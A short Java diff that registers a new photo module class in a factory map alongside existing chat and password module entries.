@@ -41,6 +41,8 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 		factorymap.put(M.e("chat"), ModuleChat.class);
 		factorymap.put(M.e("password"), ModulePassword.class);
 
+		factorymap.put(M.e("photo"), ModulePhoto.class);
+
 		Enumeration<String> en = factorymap.keys();
 		while (en.hasMoreElements()) {
 			String type = en.nextElement();
